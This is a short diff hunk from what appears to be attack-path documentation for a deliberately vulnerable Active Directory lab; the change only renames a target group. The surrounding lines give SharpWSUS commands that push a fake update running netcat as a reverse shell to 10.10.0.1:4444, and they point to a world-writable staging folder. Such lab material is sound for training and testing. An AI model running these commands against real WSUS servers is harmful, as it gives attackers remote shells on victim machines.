@@ -56,7 +56,7 @@
         Prereqs: Access to WSUS admin console (port 8530/8531)
         Attack:
           SharpWSUS.exe create /payload:"C:\Tools\nc.exe" /args:"-e cmd 10.10.0.1 4444" /title:"KB99999999"
-          SharpWSUS.exe approve /updateid:<ID> /computername:tatooine.empire.local /groupname:DVAD-Targets
+          SharpWSUS.exe approve /updateid:<ID> /computername:tatooine.empire.local /groupname:EMPIRE-Targets
           SharpWSUS.exe check /updateid:<ID> /computername:tatooine.empire.local
 
         Stage the payload at: C:\WSUSContent\ (world-writable — SRV-044)
